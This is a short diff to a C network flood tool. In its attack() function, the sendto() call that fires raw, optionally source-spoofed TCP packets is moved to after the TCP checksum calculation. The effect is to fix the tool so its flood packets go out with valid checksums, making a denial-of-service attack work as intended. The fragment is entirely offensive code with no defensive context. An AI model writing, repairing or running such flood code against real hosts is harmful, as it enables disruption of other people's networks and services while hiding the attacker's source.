@@ -363,9 +363,6 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         if (time(NULL) - start >= ttime)
             handle_exit();
 
-        // Send our newly modified loop packet.
-        sendto(rawsock, tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;
-
         // IP generation math
         if (sourceFullSpoof == true)
         {
@@ -507,6 +504,9 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
 
         // Calculate TCP checksum
         xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.ph, sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+
+        // Send our newly modified loop packet.
+        sendto(rawsock, tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;
     }
 }
 
